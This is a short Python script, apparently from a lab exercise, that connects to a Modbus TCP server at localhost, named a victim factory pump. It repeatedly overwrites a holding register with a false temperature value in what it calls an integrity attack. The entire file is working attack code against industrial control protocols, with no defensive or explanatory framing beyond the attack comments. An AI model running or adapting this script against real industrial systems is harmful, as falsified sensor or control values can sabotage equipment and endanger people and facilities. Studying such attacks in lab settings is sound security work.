from pymodbus.client import ModbusTcpClient
import time

# ATTACK CONFIGURATION
TARGET_IP = '127.0.0.1'
TARGET_PORT = 5020  # The port the "Victim" is listening on
REGISTER_ADDRESS = 0 # The memory slot to corrupt (Register 1)
DANGEROUS_VALUE = 999 # The fake temperature

# 1. Connect to the Target (The Factory Pump)
client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
client.connect()

print(f"[!] Connected to Victim at {TARGET_IP}:{TARGET_PORT}")
print("[*] Starting Integrity Attack (Modification)")

# 2. Loop to constantly overwrite the value
try:
    while True:
        # Write the dangerous value to the holding register
        # Unit=1 matches your Slave ID
        client.write_register(REGISTER_ADDRESS, DANGEROUS_VALUE)
        
        print(f" -> INJECTED: Overwrote Register {REGISTER_ADDRESS+1} with {DANGEROUS_VALUE}")
        time.sleep(2) # Attack every 2 seconds

except KeyboardInterrupt:
    print("\n[!] Attack Stopped.")
    client.close()